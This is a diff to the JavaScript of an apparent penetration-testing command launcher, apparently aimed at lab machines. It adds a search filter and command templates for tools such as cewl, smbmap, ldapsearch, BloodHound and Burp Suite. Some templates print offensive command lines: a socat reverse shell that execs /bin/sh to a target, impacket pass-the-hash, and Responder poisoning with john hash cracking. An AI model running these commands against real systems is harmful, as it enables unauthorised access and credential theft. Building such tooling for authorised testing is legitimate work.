@@ -482,15 +482,57 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     // ============================================================
+    //  🔍 FILTER ARSENAL
+    // ============================================================
+    window.filterArsenal = function (query) {
+        const q = query.toLowerCase().trim();
+        const totalSpan = document.getElementById('arsenal-total-count');
+        let visibleCount = 0;
+        let totalCount = 0;
+
+        document.querySelectorAll('.cat-header').forEach(header => {
+            const body = header.nextElementSibling;
+            if (!body || !body.classList.contains('cat-body')) return;
+            const buttons = body.querySelectorAll('.tool-btn');
+            let hasVisible = false;
+
+            buttons.forEach(btn => {
+                totalCount++;
+                const text = btn.textContent.toLowerCase();
+                if (!q || text.includes(q)) {
+                    btn.style.display = '';
+                    hasVisible = true;
+                    visibleCount++;
+                } else {
+                    btn.style.display = 'none';
+                }
+            });
+
+            // Show category if it has visible tools
+            if (hasVisible) {
+                header.style.display = '';
+                body.style.display = '';
+            } else {
+                header.style.display = q ? 'none' : '';
+                body.style.display = q ? 'none' : '';
+            }
+        });
+
+        if (totalSpan) {
+            totalSpan.textContent = q ? `[${visibleCount}/${totalCount}]` : `[${totalCount}]`;
+        }
+    };
+
+    // ============================================================
     //  🚀 LAUNCH TOOL
     // ============================================================
     window.launchTool = function (tool) {
         const target = targetInput.value.trim();
         const needsTarget = [
-            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan',
-            'nmap','masscan','netcat','dnsrecon','curl',
-            'enum4linux','smbclient','evil-winrm','impacket',
-            'hydra-ssh','hydra-ftp','sqlmap','responder'
+            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan','cewl',
+            'nmap','masscan','netcat','dnsrecon','curl','socat',
+            'enum4linux','smbclient','smbmap','ldapsearch','bloodhound','evil-winrm','impacket',
+            'hydra-ssh','hydra-ftp','sqlmap','responder','burpsuite'
         ];
         if (needsTarget.includes(tool) && !target) {
             alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
@@ -535,6 +577,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                 description = 'Wpscan — WordPress scanner';
                 break;
+            case 'cewl':
+                command = `cewl -d 2 -m 5 -w /tmp/cewl_${target}.txt http://${target} 2>/dev/null; echo "Wordlist saved: /tmp/cewl_${target}.txt"`;
+                description = 'Cewl — custom wordlist generator';
+                break;
 
             // ── Network ──
             case 'nmap':
@@ -557,6 +603,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 command = `curl -s -I -L --user-agent "Mozilla/5.0" http://${target}`;
                 description = 'Curl — HTTP headers + redirects';
                 break;
+            case 'socat':
+                command = `echo "╔═ Socat Guide ═╗\n\n# Listen on port (reverse shell catch):\nsocat TCP-LISTEN:4444,fork,reuseaddr -\n\n# Connect back:\nsocat EXEC:/bin/sh TCP:${target}:4444\n\n# Port forward:\nsocat TCP-LISTEN:8080,fork TCP:${target}:80\n\n# SSL wrapper:\nsocat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80"`;
+                description = 'Socat — TCP/UDP relay & shell';
+                break;
 
             // ── SMB / Windows ──
             case 'enum4linux':
@@ -574,6 +624,18 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'impacket':
                 command = `echo "╔═ Impacket Suite ═╗\n\npsexec.py <dom>/<user>:<pass>@${target}\nsmbexec.py <dom>/<user>:<pass>@${target}\nwmiexec.py <dom>/<user>:<pass>@${target}\n\n# Pass-the-hash\npsexec.py <dom>/<user>@${target} -hashes LM:NTLM"`;
                 description = 'Impacket — psexec/smbexec/wmiexec';
+                break;
+            case 'smbmap':
+                command = `smbmap -H ${target} -u '' -p '' -r . 2>/dev/null || smbmap -H ${target} -u 'guest' -p '' -r .`;
+                description = 'Smbmap — SMB share permissions';
+                break;
+            case 'ldapsearch':
+                command = `echo "# LDAP anonymous bind example:\nldapsearch -x -H ldap://${target} -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\" 2>&1 | head -100\n\n# With creds:\nldapsearch -x -H ldap://${target} -D \"cn=<user>,dc=htb,dc=local\" -w <pass> -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\""`;
+                description = 'Ldapsearch — LDAP enumeration';
+                break;
+            case 'bloodhound':
+                command = `echo "╔═ BloodHound Ingestor ═╗\n\n# Run from Kali (authenticated):\nbloodhound-python -d <domain> -u <user> -p <pass> -ns ${target} -c All\n\n# Run from Kali (with LDAP):\nbloodhound-python -d <domain> -u <user> -p <pass> -dc ${target} -c All\n\n# Output .json files can be imported to BloodHound GUI"`;
+                description = 'BloodHound — AD ingestor (python)';
                 break;
 
             // ── Pivoting ──
@@ -650,6 +712,10 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'responder':
                 command = `echo "╔═ Responder Guide ═╗\n\n# Start LLMNR/NBT-NS poisoner:\nsudo responder -I eth0 -dwv\n\n# To capture hashes on the network:\n# Target will try to resolve a non-existent host\n# Hashes captured in /usr/share/responder/logs/\n\n# Crack with john:\nsudo john /usr/share/responder/logs/*.txt --wordlist=/usr/share/wordlists/rockyou.txt"`;
                 description = 'Responder — LLMNR/NBT-NS poisoning';
+                break;
+            case 'burpsuite':
+                command = `echo "╔═ BurpSuite ═╗\n\n# 1. Launch BurpSuite GUI in Kali:\nburpsuite 2>/dev/null &\n\n# 2. Or from CLI:\njava -jar /opt/burpsuite.jar --collaborator-server 2>/dev/null &\n\n# 3. Proxy config:\n# Browser → 127.0.0.1:8080\n# CA cert → http://burpsuite\n\n# 4. REST API (headless):\njava -jar /opt/burpsuite.jar --project-file=/tmp/project --collaborator-server --config-file=/tmp/config.json 2>/dev/null &\n\n⚠️  BurpSuite runs in Kali GUI session. Use SSH -X if needed."`;
+                description = 'BurpSuite — launch & proxy guide';
                 break;
 
             // ── Extract / Compress ──
